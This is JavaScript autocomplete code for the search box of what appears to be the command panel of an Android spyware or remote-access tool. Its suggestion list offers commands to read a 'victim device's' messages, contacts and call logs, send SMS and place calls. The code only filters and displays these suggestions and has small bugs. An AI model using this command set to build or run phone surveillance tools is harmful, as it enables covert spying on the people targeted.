let suggestions = [
    "DEVICE_DETAILS: Returns device information",
"INSTALLED_APPS: Returns all installed apps (package names)",
"VIBRATE option(time in seconds): Vibrates the phone",
"MAKE_CALL number(required): Places a call to the given number",
"GET_MESSAGES option(DD/MM/YYYY): Returns all messages from the target device if we specify the date it will return messages on that date",
"SEND_MESSAGE number(required) message(any length with or without spaces): Sends message to the given number",
"OPEN_APP package_name(required): opens specific app in the victim device(some apps may not able to open)",
"VOLUME INCREASE_VOLUME: INcreases the volume by 1 point",
"VOLUME DECREASE_VOLUME: Decreases the volume by 1 point",
"VOLUME RING: It rings the mobile",
"VOLUME MUTE: Mutes the ringtone",
"VOLUME UNMUTE: Unmutes the ringtone",
"GET_CONTACTS: Returns all saved contacts",
"GET_CALL_LOGS: Returns all call logs"
];

// getting all required elements
const searchInput = document.querySelector(".searchInput");
const input = searchInput.querySelector("input");
const resultBox = searchInput.querySelector(".resultBox");
const icon = searchInput.querySelector(".icon");
let linkTag = searchInput.querySelector("a");
let webLink;

// if user press any key and release
input.onkeyup = (e)=>{
    let userData = e.target.value; //user enetered data
    let emptyArray = [];
    if(userData){
        emptyArray = suggestions.filter((data)=>{
            //filtering array value and user characters to lowercase and return only those words which are start with user enetered chars
            return data.toLocaleLowerCase().startsWith(userData.toLocaleLowerCase()); 
        });
        emptyArray = emptyArray.map((data)=>{
            // passing return data inside li tag
            return data = '<li>'+ data +'</li>';
        });
        searchInput.classList.add("active"); //show autocomplete box
        showSuggestions(emptyArray);
        let allList = resultBox.querySelectorAll("li");
        for (let i = 0; i < allList.length; i++) {
            //adding onclick attribute in all li tag
            allList[i].setAttribute("onclick", "select(this)");
        }
    }else{
        searchInput.classList.remove("active"); //hide autocomplete box
    }
}

function showSuggestions(list){
    let listData;
    if(!list.length){
        userValue = inputBox.value;
        listData = '<li>'+ userValue +'</li>';
    }else{
        listData = list.join('');
    }
    resultBox.innerHTML = listData;
}